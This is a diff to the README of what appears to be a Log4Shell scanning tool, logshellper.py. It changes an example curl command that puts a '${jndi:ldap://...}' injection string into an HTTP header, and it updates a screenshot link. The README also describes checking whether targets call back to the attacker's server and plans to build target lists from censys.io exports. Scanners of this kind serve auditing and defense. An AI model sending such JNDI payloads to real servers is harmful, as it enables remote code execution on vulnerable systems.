@@ -10,7 +10,7 @@ While the original intent was to quickly audit multiple servers, the --payload o
 E.g.
 
 ```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/o=refence}
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/a}
 ```
 ### Usage
 ![Imgur](https://i.imgur.com/PlMudwa.png)
@@ -32,8 +32,7 @@ Run logshellper.py
 
 
 Check results. If the target show up on the attacker's server, the target is exploitable.
-[Imgur](https://i.imgur.com/txashNw.png)
-
+![Imgur](https://i.imgur.com/jZYjjmV.png)
 
 ### TODO
 parse .csv file (i.e. exported form censys.io) to build targets.
